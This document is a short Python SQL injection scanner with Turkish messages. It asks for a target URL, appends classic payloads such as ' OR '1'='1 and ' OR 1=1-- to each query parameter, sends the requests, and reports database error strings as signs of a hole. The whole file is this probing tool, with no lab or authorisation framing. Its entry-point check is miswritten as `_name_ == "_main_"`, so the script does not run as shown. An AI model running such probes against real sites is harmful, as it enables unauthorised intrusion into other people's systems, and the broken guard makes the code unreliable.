import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

sql_payloads = ["'", "'--", "\"", "\"--", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--"]

def is_vulnerable(response_text):
    errors = [
        "you have an error in your sql syntax",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "ODBC SQL",
        "mysql_fetch",
        "supplied argument is not a valid MySQL result resource"
    ]
    return any(error.lower() in response_text.lower() for error in errors)

def test_url(url):
    parsed_url = urlparse(url)
    qs = parse_qs(parsed_url.query)

    if not qs:
        print("[!] URL’de sorgu parametresi yok. SQLi test edilemiyor.")
        return False

    vulnerable = False

    for param in qs:
        original = qs[param][0]
        for payload in sql_payloads:
            qs[param][0] = original + payload
            new_query = urlencode(qs, doseq=True)
            new_url = urlunparse(parsed_url._replace(query=new_query))
            print(f"[+] Test ediliyor: {new_url}")
            try:
                res = requests.get(new_url, timeout=5)
                if is_vulnerable(res.text):
                    print(f"[!!!] POTANSİYEL SQL INJECTION AÇIĞI BULUNDU: {new_url}")
                    vulnerable = True
            except requests.exceptions.RequestException:
                print(f"[-] Bağlantı hatası: {new_url}")
            time.sleep(0.5)  # Rate limit

    return vulnerable

def run():
    target_url = input("Hedef URL'yi gir (örn: http://site.com/page.php?id=1): ").strip()
    if not target_url:
        print("[-] Geçerli bir URL girmen lazım.")
        return

    print("[*] SQL Injection taraması başlatıldı...")
    if test_url(target_url):
        print("[✔] Tarama tamamlandı. Zafiyet bulundu.")
    else:
        print("[x] Tarama tamamlandı. Zafiyet tespit edilmedi.")
if _name_ == "_main_":
    run()
